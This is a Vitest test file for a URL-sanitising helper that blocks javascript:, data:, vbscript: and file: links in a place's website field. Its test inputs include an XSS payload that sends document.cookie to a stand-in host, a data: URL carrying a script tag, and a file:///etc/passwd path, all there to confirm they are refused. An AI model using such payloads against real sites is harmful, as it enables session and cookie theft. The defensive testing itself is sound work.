// ─────────────────────────────────────────────────────────────────────────────
// safeWebsiteHref — Phase 8 review finding MEDIUM-1.
//
// `places.website` has no protocol CHECK in the database (migration 013), and
// a direct PostgREST call can write a javascript:/data: value to it — proven
// during the Phase 8 review by inserting and updating one against a real
// PGlite instance with no error. app/place/[id]/page.tsx is the only place
// this codebase renders that field as an anchor, so this is the render
// boundary that has to refuse an unsafe scheme rather than trust React's
// console warning.
// ─────────────────────────────────────────────────────────────────────────────

import { describe, expect, it } from 'vitest';
import { safeWebsiteHref } from '@/lib/places/safeLink';

describe('safeWebsiteHref', () => {
  it('allows an https:// URL', () => {
    expect(safeWebsiteHref('https://www.watpho.com')).toBe('https://www.watpho.com');
  });

  it('allows an http:// URL', () => {
    expect(safeWebsiteHref('http://example.com')).toBe('http://example.com');
  });

  it('refuses a javascript: URL', () => {
    expect(safeWebsiteHref('javascript:fetch("https://evil.test?c="+document.cookie)')).toBeNull();
  });

  it('refuses a data: URL', () => {
    expect(safeWebsiteHref('data:text/html,<script>alert(1)</script>')).toBeNull();
  });

  it('refuses a malformed URL', () => {
    expect(safeWebsiteHref('not a url')).toBeNull();
    expect(safeWebsiteHref('  ')).toBeNull();
  });

  it('refuses other unsafe or unsupported schemes', () => {
    expect(safeWebsiteHref('vbscript:msgbox(1)')).toBeNull();
    expect(safeWebsiteHref('file:///etc/passwd')).toBeNull();
    // Schemeless input is not a URL `new URL()` can parse, so it is refused
    // rather than silently resolved against some assumed base.
    expect(safeWebsiteHref('example.com')).toBeNull();
  });

  it('treats null, undefined and empty string as absent', () => {
    expect(safeWebsiteHref(null)).toBeNull();
    expect(safeWebsiteHref(undefined)).toBeNull();
    expect(safeWebsiteHref('')).toBeNull();
  });
});
